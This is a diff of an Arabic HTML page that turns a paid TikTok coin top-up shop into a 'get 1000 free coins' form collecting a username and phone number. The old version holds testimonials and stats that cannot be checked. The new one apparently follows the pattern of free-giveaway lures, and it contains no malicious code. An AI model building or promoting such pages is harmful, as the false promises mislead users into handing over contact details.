@@ -3,111 +3,44 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>شحن عملات تيك توك - أرخص وأسرع خدمة في مصر</title>
+    <title>احصل على كوينز تيك توك مجاناً</title>
     <link rel="stylesheet" href="style.css" />
 </head>
 <body>
 
     <header>
         <div class="container">
-            <h1>💰 شحن عملات تيك توك</h1>
-            <p>أرخص الأسعار في مصر – شحن فوري وآمن</p>
-            <div class="stats">
-                <span>⭐ 4.9/5 (1,200+ تقييم)</span>
-                <span>👥 15,000+ عميل سعيد</span>
-                <span>⚡ 5M+ كوينز تم شحنها</span>
-            </div>
+            <h1>🎁 احصل على كوينز تيك توك مجاناً</h1>
+            <p>أدخل اسم المستخدم بتاعك واحصل على 1000 كوينز هدية</p>
         </div>
     </header>
 
-    <section class="pricing">
+    <section class="main-form">
         <div class="container">
-            <h2>اختر الباقة المناسبة لك</h2>
-            <div class="cards" id="cards-container"></div>
-        </div>
-    </section>
+            <div class="form-box">
+                <h2>📝 أدخل بياناتك</h2>
+                <form id="requestForm">
+                    <label for="username">اسم المستخدم على تيك توك</label>
+                    <input type="text" id="username" placeholder="@user123" required />
 
-    <section class="payment-methods">
-        <div class="container">
-            <h2>💳 طريقة الدفع</h2>
-            <div class="methods-grid">
-                <div class="method">📱 فودافون كاش: <strong>01092063005</strong></div>
-            </div>
-            <p style="margin-top: 15px; color: #555;">قم بتحويل المبلغ على الرقم أعلاه، ثم ارفع صورة الإيصال</p>
-        </div>
-    </section>
+                    <label for="phone">رقم الهاتف (للتواصل)</label>
+                    <input type="text" id="phone" placeholder="01012345678" required />
 
-    <section class="order-form" id="order-form" style="display: none;">
-        <div class="container">
-            <h2>📋 تأكيد الطلب</h2>
-            <form id="orderForm" enctype="multipart/form-data">
-                <label for="username">اسم المستخدم على تيك توك</label>
-                <input type="text" id="username" placeholder="@user123" required />
-
-                <label for="phone">رقم الهاتف (للتواصل)</label>
-                <input type="text" id="phone" placeholder="01012345678" required />
-
-                <label for="coins">عدد العملات</label>
-                <input type="text" id="coins" readonly />
-
-                <label for="price">السعر (جنيه مصري)</label>
-                <input type="text" id="price" readonly />
-
-                <label for="payment">طريقة الدفع</label>
-                <select id="payment" required>
-                    <option value="فودافون كاش">📱 فودافون كاش</option>
-                </select>
-
-                <label for="receipt">📎 صورة إيصال التحويل</label>
-                <input type="file" id="receipt" accept="image/*" required />
-
-                <button type="submit">✅ تأكيد الشراء</button>
-                <button type="button" onclick="closeForm()">❌ إلغاء</button>
-            </form>
-        </div>
-    </section>
-
-    <section class="testimonials">
-        <div class="container">
-            <h2>💬 آراء العملاء</h2>
-            <div class="testimonial-grid">
-                <div class="testimonial">
-                    <p>"أسرع خدمة شحن في مصر! الكوينز وصلت في دقائق."</p>
-                    <h4>— أحمد محمد</h4>
-                    <span>⭐⭐⭐⭐⭐</span>
-                </div>
-                <div class="testimonial">
-                    <p>"أرخص سعر لقيتهم في السوق. أنصح أي حد يشتري من هنا."</p>
-                    <h4>— سارة علي</h4>
-                    <span>⭐⭐⭐⭐⭐</span>
-                </div>
-                <div class="testimonial">
-                    <p>"تعامل محترم وسرعة فائقة. هكرر الشراء أكيد."</p>
-                    <h4>— كريم حسن</h4>
-                    <span>⭐⭐⭐⭐⭐</span>
-                </div>
-                <div class="testimonial">
-                    <p>"كنت خايف في الأول، لكن الصراحة خدمة ممتازة وآمنة."</p>
-                    <h4>— نورا ياسر</h4>
-                    <span>⭐⭐⭐⭐⭐</span>
-                </div>
-                <div class="testimonial">
-                    <p>"شكرًا على الخصم! بجد أرخص موقع شحن في مصر."</p>
-                    <h4>— يوسف مصطفى</h4>
-                    <span>⭐⭐⭐⭐⭐</span>
-                </div>
-                <div class="testimonial">
-                    <p>"شحن فوري وأسعار تنافسية. أوصي بيه لكل أصحابي."</p>
-                    <h4>— ليلى عمرو</h4>
-                    <span>⭐⭐⭐⭐⭐</span>
-                </div>
+                    <button type="submit">🎁 احصل على الكوينز</button>
+                </form>
+                <p id="successMessage" style="display: none; color: green; margin-top: 15px;">
+                    ✅ تم استلام طلبك! هتوصلك الكوينز خلال 24 ساعة.
+                </p>
             </div>
         </div>
     </section>
 
     <footer>
         <div class="container">
-            <p>© 2026 جميع الحقوق محفوظة – خدمة شحن عملات تيك توك</p>
+            <p>© 2026 - هدايا كوينز تيك توك</p>
+            <p style="margin-top: 10px; font-size: 14px;">
+                <a href="admin.html" style="color: #fff; text-decoration: underline;">👑 لوحة التحكم</a>
+            </p>
         </div>
     </footer>
 
